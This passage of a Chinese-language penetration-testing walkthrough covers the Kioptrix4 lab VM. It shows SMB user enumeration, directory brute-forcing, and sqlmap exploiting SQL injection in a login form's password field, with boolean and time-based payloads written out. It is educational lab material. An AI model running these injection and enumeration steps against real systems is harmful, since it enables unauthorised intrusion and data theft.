class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 327.70 seconds<br></code></pre></td></tr></table></figure><p>枚举结果中有些比较有意思的 <code>/database.sql</code>, <code>/images/</code>, <code>index</code>。接下来要做两件事，首先是更全面的目录扫描，再一个是关于 smb，使用 nmap 自带的脚本进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo smbmap -H 192.1.1.135         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] IP: 192.1.1.135:445 Name: 192.1.1.135                                       <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        IPC$                                                    NO ACCESS       IPC Service (Kioptrix4 server (Samba, Ubuntu))<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse  192.1.1.135    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 09:53 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.135<br>Host is up (0.00014s latency).<br>Not shown: 566 closed tcp ports (reset), 430 filtered tcp ports (no-response)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 00:0C:29:D5:52:BC (VMware)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.1.1.135\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (Kioptrix4 server (Samba, Ubuntu))<br>|     Users: 1<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.1.1.135\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br>| smb-enum-users: <br>|   KIOPTRIX4\john (RID: 3002)<br>|     Full name:   ,,,<br>|     Flags:       Normal user account<br>|   KIOPTRIX4\loneferret (RID: 3000)<br>|     Full name:   loneferret,,,<br>|     Flags:       Normal user account<br>|   KIOPTRIX4\nobody (RID: 501)<br>|     Full name:   nobody<br>|     Flags:       Normal user account<br>|   KIOPTRIX4\robert (RID: 3004)<br>|     Full name:   ,,,<br>|     Flags:       Normal user account<br>|   KIOPTRIX4\root (RID: 1000)<br>|     Full name:   root<br>|_    Flags:       Normal user account<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.12 seconds<br></code></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>虽然枚举出了很多 user，但是共享的路径中没有特别值得关注的，看看目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo dirsearch -u http://192.1.1.135               <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.135/_23-07-15_09-58-59.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-15_09-58-59.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.135/<br><br>[09:59:00] Starting: <br>[09:59:01] 403 -  329B  - /.ht_wsr.txt                                     <br>[09:59:01] 403 -  333B  - /.htaccess_extra                                 <br>[09:59:01] 403 -  332B  - /.htaccess.bak1<br>[09:59:01] 403 -  332B  - /.htaccess_orig<br>[09:59:01] 403 -  331B  - /.htaccessOLD2<br>[09:59:01] 403 -  330B  - /.htaccess_sc<br>[09:59:01] 403 -  332B  - /.htaccess.save<br>[09:59:01] 403 -  330B  - /.htaccessBAK<br>[09:59:01] 403 -  332B  - /.htaccess.orig<br>[09:59:01] 403 -  334B  - /.htaccess.sample<br>[09:59:01] 403 -  330B  - /.htaccessOLD<br>[09:59:01] 403 -  323B  - /.html<br>[09:59:01] 403 -  322B  - /.htm                                            <br>[09:59:01] 403 -  328B  - /.htpasswds<br>[09:59:01] 403 -  332B  - /.htpasswd_test<br>[09:59:01] 403 -  329B  - /.httr-oauth                                     <br>[09:59:13] 403 -  326B  - /cgi-bin/                                         <br>[09:59:13] 200 -  109B  - /checklogin                                       <br>[09:59:13] 200 -  109B  - /checklogin.php                                   <br>[09:59:15] 200 -  298B  - /database.sql                                     <br>[09:59:15] 403 -  322B  - /doc/                                             <br>[09:59:15] 403 -  326B  - /doc/api/                                         <br>[09:59:15] 403 -  337B  - /doc/html/index.html                              <br>[09:59:15] 403 -  336B  - /doc/stable.version<br>[09:59:15] 403 -  337B  - /doc/en/changes.html                              <br>[09:59:18] 200 -  930B  - /images/                                          <br>[09:59:18] 301 -  350B  - /images  -&gt;  http://192.1.1.135/images/<br>[09:59:19] 200 -    1KB - /index.php                                        <br>[09:59:19] 200 -    1KB - /index                                            <br>[09:59:19] 200 -    1KB - /index.php/login/                                 <br>[09:59:21] 302 -    0B  - /logout  -&gt;  index.php                            <br>[09:59:21] 302 -    0B  - /logout.php  -&gt;  index.php                        <br>[09:59:21] 302 -    0B  - /logout/  -&gt;  index.php                           <br>[09:59:21] 302 -  220B  - /member  -&gt;  index.php                            <br>[09:59:21] 302 -  220B  - /member.php  -&gt;  index.php                        <br>[09:59:21] 302 -  220B  - /member/login.php  -&gt;  index.php<br>[09:59:21] 302 -  220B  - /member/  -&gt;  index.php<br>[09:59:21] 302 -  220B  - /member/login  -&gt;  index.php                      <br>[09:59:22] 302 -  220B  - /member/login.html  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/admin.asp  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.js  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.jsp  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.aspx  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.asp  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.py  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/logon  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/login.rb  -&gt;  index.php<br>[09:59:22] 302 -  220B  - /member/signin  -&gt;  index.php                     <br>[09:59:28] 403 -  331B  - /server-status                                    <br>[09:59:28] 403 -  332B  - /server-status/<br></code></pre></td></tr></table></figure><p>整理下需要关注的目录：<code>/checklogin.php</code>, <code>/database.sql</code>, <code>index</code>，不过有点不放心，毕竟没有专门指定后缀名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,rar,gz,txt,sql<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.135<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              gz,txt,sql,php,zip,rar<br>[+] Timeout:                 10s<br>===============================================================<br>2023/07/15 10:10:35 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 1255]<br>/images               (Status: 301) [Size: 350] [--&gt; http://192.1.1.135/images/]<br>/index                (Status: 200) [Size: 1255]<br>/member               (Status: 302) [Size: 220] [--&gt; index.php]<br>/member.php           (Status: 302) [Size: 220] [--&gt; index.php]<br>/database.sql         (Status: 200) [Size: 298]<br>/logout               (Status: 302) [Size: 0] [--&gt; index.php]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]<br>/john                 (Status: 301) [Size: 348] [--&gt; http://192.1.1.135/john/]<br>/robert               (Status: 301) [Size: 350] [--&gt; http://192.1.1.135/robert/]<br>/server-status        (Status: 403) [Size: 331]<br>Progress: 1542950 / 1543927 (99.94%)<br>===============================================================                                                     <br>2023/07/15 10:15:58 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>这下子的确发现了一些额外的目录，分别开始尝试吧</p><p>进入 Web 界面发现是个登录界面</p><p><img src="/pic/e35eb10a3554c8a01c840f07eb830fbe_MD5.png"></p><p>尝试搜一下漏洞库里有没有，毕竟是 2013 年的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ searchsploit LigGoat                                <br>Exploits: No Results<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>并没有漏洞信息，接下来看看 sql 文件</p><p><img src="/pic/44526657065c688d318a7c0fa500b09d_MD5.png"></p><p>得到了一个用户名和密码，尝试登录但是失败，可能是 1234 这个密码被修改过了，但是用户名应该是没问题的。尝试 burp 抓包，进行密码爆破</p><p><img src="/pic/11c4e72d227842db6c3d72db2b170715_MD5.png"></p><p>爆破虽然没有得到密码，但是却发现了存在 SQL 注入</p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>直接 SQLMap 吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sqlmap -r login --current-db<br>        ___<br>       __H__                                                                                                        <br> ___ ___[,]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;                                                                            </span><br>|_ -| . [(]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|                                                                                           </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 10:26:55 /2023-07-15/<br><br>[10:26:55] [INFO] parsing HTTP request from <span class="hljs-string">&#x27;login&#x27;</span><br>[10:26:56] [INFO] testing connection to the target URL<br>[10:26:56] [INFO] checking <span class="hljs-keyword">if</span> the target is protected by some kind of WAF/IPS<br>[10:26:56] [INFO] testing <span class="hljs-keyword">if</span> the target URL content is stable<br>[10:26:56] [INFO] target URL content is stable<br>[10:26:56] [INFO] testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-string">&#x27;myusername&#x27;</span> is dynamic<br>[10:26:56] [WARNING] POST parameter <span class="hljs-string">&#x27;myusername&#x27;</span> does not appear to be dynamic<br>[10:26:56] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that POST parameter <span class="hljs-string">&#x27;myusername&#x27;</span> might not be injectable<br>[10:26:56] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on POST parameter <span class="hljs-string">&#x27;myusername&#x27;</span><br>[10:26:56] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[10:26:56] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br>[10:26:56] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span><br>[10:27:04] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span><br>[10:27:05] [INFO] testing <span class="hljs-string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span><br>[10:27:05] [INFO] testing <span class="hljs-string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span><br>[10:27:06] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[10:27:06] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span><br>[10:27:06] [CRITICAL] considerable lagging has been detected <span class="hljs-keyword">in</span> connection response(s). Please use as high value <span class="hljs-keyword">for</span> option <span class="hljs-string">&#x27;--time-sec&#x27;</span> as possible (e.g. 10 or more)<br>[10:27:06] [INFO] testing <span class="hljs-string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span><br>[10:27:06] [INFO] testing <span class="hljs-string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span><br>[10:27:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br>[10:27:07] [INFO] testing <span class="hljs-string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span><br>[10:27:07] [INFO] testing <span class="hljs-string">&#x27;Microsoft SQL Server/Sybase time-based blind (IF)&#x27;</span><br>[10:27:07] [INFO] testing <span class="hljs-string">&#x27;Oracle AND time-based blind&#x27;</span><br>it is recommended to perform only basic UNION tests <span class="hljs-keyword">if</span> there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y<br>[10:27:09] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 10 columns&#x27;</span><br>[10:27:09] [WARNING] POST parameter <span class="hljs-string">&#x27;myusername&#x27;</span> does not seem to be injectable<br>[10:27:09] [INFO] testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> is dynamic<br>[10:27:09] [WARNING] POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> does not appear to be dynamic<br>[10:27:09] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> might be injectable (possible DBMS: <span class="hljs-string">&#x27;MySQL&#x27;</span>)<br>[10:27:09] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span><br>it looks like the back-end DBMS is <span class="hljs-string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] y<br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;MySQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] y<br>[10:27:12] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[10:27:12] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br>[10:27:12] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[10:27:12] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>[10:27:12] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>got a 302 redirect to <span class="hljs-string">&#x27;http://192.1.1.135/login_success.php?username=john&#x27;</span>. Do you want to follow? [Y/n] y<br>redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y<br>[10:27:15] [INFO] POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> appears to be <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span> injectable (with --code=302) <br>……………………………………<br>[10:27:25] [INFO] POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> appears to be <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable <br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[10:27:25] [INFO] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found<br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;</span><br>[10:27:25] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;</span><br>[10:27:25] [WARNING] <span class="hljs-keyword">in</span> OR boolean-based injection cases, please consider usage of switch <span class="hljs-string">&#x27;--drop-set-cookie&#x27;</span> <span class="hljs-keyword">if</span> you experience any problems during data retrieval<br>[10:27:25] [INFO] checking <span class="hljs-keyword">if</span> the injection point on POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> is a <span class="hljs-literal">false</span> positive<br>POST parameter <span class="hljs-string">&#x27;mypassword&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] y<br>[10:27:30] [WARNING] POST parameter <span class="hljs-string">&#x27;Submit&#x27;</span> does not appear to be dynamic<br>[10:27:30] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that POST parameter <span class="hljs-string">&#x27;Submit&#x27;</span> might not be injectable<br>………………………………………………<br>[10:27:41] [WARNING] POST parameter <span class="hljs-string">&#x27;Submit&#x27;</span> does not seem to be injectable<br>sqlmap identified the following injection point(s) with a total of 3377 HTTP(s) requests:<br>---<br>Parameter: mypassword (POST)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<br>    Payload: myusername=john&amp;mypassword=-2527<span class="hljs-string">&#x27; OR 7958=7958#&amp;Submit=Login</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: myusername=john&amp;mypassword=1234&#x27;</span> AND (SELECT 6799 FROM (SELECT(SLEEP(5)))huMm)-- NgWU&amp;Submit=Login<br>---<br>[10:27:41] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 8.04 (Hardy Heron)<br>web application technology: PHP 5.2.4, PHP, Apache 2.2.8<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[10:27:41] [INFO] fetching current database<br>[10:27:41] [WARNING] running <span class="hljs-keyword">in</span> a single-thread mode. Please consider usage of option <span class="hljs-string">&#x27;--threads&#x27;</span> <span class="hljs-keyword">for</span> faster data retrieval<br>[10:27:41] [INFO] retrieved: members<br>current database: <span class="hljs-string">&#x27;members&#x27;</span><br>[10:27:41] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/home/kali/.local/share/sqlmap/output/192.1.1.135&#x27;</span><br><br>[*] ending @ 10:27:41 /2023-07-15/<br></code></pre></td></tr></table></figure><p>得到了数据库名字，那接下来依次获取感兴趣的信息就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sqlmap -r login -p password -D members --tables<br>        ___<br>       __H__                                                                                                        <br> ___ ___[)]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;                                                                            </span><br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [.]_|_|_|__,|  _|                                                                                           </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 10:28:44 /2023-07-15/<br><br>[10:28:44] [INFO] parsing HTTP request from <span class="hljs-string">&#x27;login&#x27;</span><br>[10:28:44] [CRITICAL] all testable parameters you provided are not present within the given request data<br><br>[*] ending @ 10:28:44 /2023-07-15/<br><br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sqlmap -r login  -D members --tables<br>        ___<br>       __H__                                                                                                        <br> ___ ___[)]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;                                                                            </span><br>|_ -| . [ ]     | . | . |                                                                                           <br>|___|_  [ ]_|_|_|__,|  _|                                                                                           <br>      |_|V...       |_|   https://sqlmap.org                                                                        <br><br>[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user\<span class="hljs-string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 10:28:51 /2023-07-15/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:28:51] [INFO] parsing HTTP request from &#x27;</span>login<span class="hljs-string">&#x27;</span><br><span 